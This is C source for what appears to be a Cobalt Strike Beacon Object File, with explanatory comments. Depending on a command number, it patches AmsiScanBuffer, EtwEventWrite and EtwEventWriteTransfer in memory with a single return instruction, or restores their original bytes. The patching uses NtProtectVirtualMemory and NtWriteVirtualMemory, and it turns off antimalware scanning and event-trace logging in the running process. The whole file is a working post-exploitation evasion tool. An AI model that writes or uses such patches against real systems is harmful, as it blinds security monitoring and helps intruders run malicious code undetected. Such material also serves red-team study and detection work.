#include <windows.h>
#include "beacon.h"

// DECLSPEC_IMPORT tells the compiler that the function definition exists in an external DLL and will be provided at link-time.
// FARPROC (Return Type) a generic pointer to a function. Since GetProcAddress is used to find other functions, it returns a pointer to them.
// WINAPI The Calling Convention. It defines how the CPU handles the function's arguments on the stack.
// KERNEL32$GetProcAddress  KERNEL32: The name of the DLL to look in. GetProcAddress: The name of the function to find.
// (HMODULE, LPCSTR) The Parameter Types. a handle to a module (HMODULE) and a pointer to a string containing the function name (LPCSTR).

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);



//NTSYSAPI: Similar to DECLSPEC_IMPORT. It tells the compiler this function is exported by the system kernel/ntdll.
//NTSTATUS: The return type. Unlike  functions that return BOOL , Native APIs return a 32-bit integer. 0x00000000 (known as STATUS_SUCCESS) means it worked. Anything else is an error code.
//NTAPI: The calling convention
//NTDLL$: This tells your BOF loader to look inside ntdll.dll to find these functions.

/* for ProtectVirtualMemory 
    HANDLE      -   to represent the current process.
    PVOID*      -   A pointer to the address you want to change
    PULONG      -   A pointer to a variable specifying the size of the region.
    ULONG       -   The new permission (0x40 for PAGE_EXECUTE_READWRITE)
    PULONG      -   A pointer to store the original permission.
*/ 


/* for WriteVirtualMemory
    PVOID       -   The exact address where the writing starts.
    PVOID       -   A pointer to your malicious bytes
    ULONG       -   How many bytes you are writing.
    PULONG      -   Stores how many bytes were successfully copied.
*/


NTSYSAPI NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
NTSYSAPI NTSTATUS NTAPI NTDLL$NtProtectVirtualMemory(HANDLE, PVOID, PULONG, ULONG, PULONG);

void ApplyPatch(void* target, unsigned char* data, size_t sz, char* msg) {
    if (!target) return;

    ULONG old;
    SIZE_T u_sz = sz;           //Memory protection is applied at the page level (usually 4096-byte chunks). The NTAPI function will actually modify the base and u_sz variables passed to it so they reflect the true, page-aligned starting address and the total size of the pages affected. If you passed the original target and sz variables, they would be overwritten
    void* base = target;

    if (NTDLL$NtProtectVirtualMemory((HANDLE)-1, &base, (PULONG)&u_sz, 0x04, &old) == 0) {   // 0x04 PAGE_READWRITE
        NTDLL$NtWriteVirtualMemory((HANDLE)-1, target, (PVOID)data, sz, NULL);
        NTDLL$NtProtectVirtualMemory((HANDLE)-1, &base, (PULONG)&u_sz, old, &old);
        BeaconPrintf(0, msg);
    }
}

void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    int cmd = BeaconDataInt(&parser);

    void* p_amsi = (void*)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    void* p_etwW = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    void* p_etwT = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWriteTransfer");

    unsigned char p_ret[] = { 0xC3 };
    
    // Original bytes for restoring
    unsigned char o_amsi[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };
    unsigned char o_etwW[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };
    unsigned char o_etwT[] = { 0x48, 0x89, 0x5C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30 };
    if (cmd == 1) {
        ApplyPatch(p_amsi, p_ret, sizeof(p_ret), " AMSI Patched.");
    } 
    else if (cmd == 2) {
        ApplyPatch(p_amsi, o_amsi, sizeof(o_amsi), " AMSI Restored.");
    } 
    if (cmd == 3) {
        // ONLY patch if the address was found!
        if (p_etwW != NULL) {
            ApplyPatch(p_etwW, p_ret, sizeof(p_ret), "[+] EtwEventWrite Patched.");
        } else {
            BeaconPrintf(0, "[!] Could not find EtwEventWrite");
        }

        if (p_etwT != NULL) {
            ApplyPatch(p_etwT, p_ret, sizeof(p_ret), "[+] EtwEventWriteTransfer Patched.");
        } else {
            BeaconPrintf(0, "[!] Could not find EtwEventWriteTransfer");
        }
    }
    else if (cmd == 4) {
        ApplyPatch(p_etwW, o_etwW, sizeof(o_etwW), " ETW Restored.");
        ApplyPatch(p_etwT, o_etwT, sizeof(o_etwT), " ETW Transfer Restored.");
    }
}
